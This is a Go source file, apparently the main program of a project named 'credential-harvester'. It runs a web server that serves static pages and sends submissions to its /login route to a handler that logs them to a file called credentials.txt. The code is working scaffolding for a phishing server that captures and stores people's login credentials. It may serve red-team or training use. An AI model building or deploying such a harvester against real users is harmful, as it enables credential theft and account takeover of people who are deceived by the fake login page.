package main

import (
	"credential-harvester/handlers"
	"flag"
	"fmt"
	"net/http"
	"os"

	log "github.com/sirupsen/logrus"
)

func main() {

	var port int
	flag.IntVar(&port, "port", 8080, "Listening port")

	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()

	logger := log.New()
	logger.SetOutput(fh)

	mux := http.NewServeMux()
	fs := http.FileServer(http.Dir("./public"))

	mux.Handle("/static/", http.StripPrefix(`/static/`, fs))
	mux.Handle(`/login`, handlers.NewLoginHandler(logger))

	server := http.Server{
		Addr: fmt.Sprintf("0.0.0.0:%d", port),
		Handler: mux,
	}

	log.Printf("starting server at localhost:%d", port)
	err = server.ListenAndServe()
	if err != nil {
		log.Printf("error: %s", err.Error())
	}
}
